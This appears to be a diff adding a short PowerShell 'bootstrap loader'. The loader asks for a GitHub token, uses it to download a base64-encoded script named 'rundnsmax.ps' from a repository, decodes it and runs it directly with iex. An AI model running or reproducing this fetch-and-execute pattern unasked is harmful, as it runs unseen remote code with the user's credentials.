@@ -1,0 +1,2 @@
+# Bootstrap Loader - Version 1.0
+$t=Read-Host "Token" -AsSecureString;$p=[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($t));iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((irm "https://api.github.com/repos/cs/launchers/contents/rundnsmax.ps" -Headers @{"Authorization"="token $p"}).content)))
